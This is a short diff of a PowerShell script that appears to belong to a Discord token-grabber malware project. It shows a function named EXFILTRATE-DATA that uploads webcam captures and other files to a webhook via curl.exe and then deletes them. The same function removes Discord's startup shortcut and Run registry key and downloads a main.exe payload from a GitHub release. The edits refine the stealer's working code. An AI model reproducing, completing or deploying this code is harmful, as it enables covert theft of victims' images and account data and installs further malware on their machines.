@@ -428,7 +428,7 @@ function EXFILTRATE-DATA {
     foreach ($item in $items) {
         $name = $item.Name
         curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:localappdata\temp\$name\`"" $webhook | out-null
-        Remove-Item $item -Force
+        Remove-Item $item.Name -Force
     }
 
     Set-Location $env:LOCALAPPDATA\Temp
@@ -451,6 +451,7 @@ function EXFILTRATE-DATA {
 
     #Disable system start discord on startup (The Program Automatically Restarts It)
     Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk" -Force
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force
     
     #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe" -OutFile "main.exe" -UseBasicParsing
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
